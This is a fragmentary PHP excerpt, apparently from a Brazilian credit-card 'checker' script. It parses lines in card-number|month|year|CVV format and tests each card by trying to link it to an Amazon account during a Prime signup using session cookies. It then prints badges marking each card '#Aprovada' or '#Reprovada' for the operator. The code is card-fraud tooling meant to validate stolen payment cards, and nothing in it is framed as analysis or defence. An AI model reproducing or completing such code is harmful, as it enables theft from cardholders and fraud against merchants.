...
if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)) {
    echo '<font color="red">Formato inválido, use o formato: 1234567890123456|12|2024|123</font><br>';
    exit();
}
...
if (strpos($r, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.")) {
    ...
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . $lista . '] » [' . $infobin . '] » <span class="badge badge-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. #Lean7</span><br>';
    return;
} else {
...
if (empty($addresid)) {
    ...
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . $lista . '] » [' . $infobin . '] » <span class="badge badge-danger"> Conta sem endereço. #Lean7</span><br>';
    return;
}
...
if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {
    ...
    echo '<span class="badge badge-success">✅ #Aprovada </span> » [' . $lista . '] » [' . $infobin . '] » <span class="badge badge-success"> Cartão vinculado com sucesso. #Lean7</span><br>';
    ...
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . $lista . '] » [' . $infobin . '] » <span class="badge badge-danger"> Cartão inexistente. (' . $err . ') #Lean7</span><br>';
    return;
    ...
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . $lista . '] » [' . $infobin . '] » <span class="badge badge-danger"> Erro ao realizar a requisação na Amazon. #Lean7</span><br>';
    return;
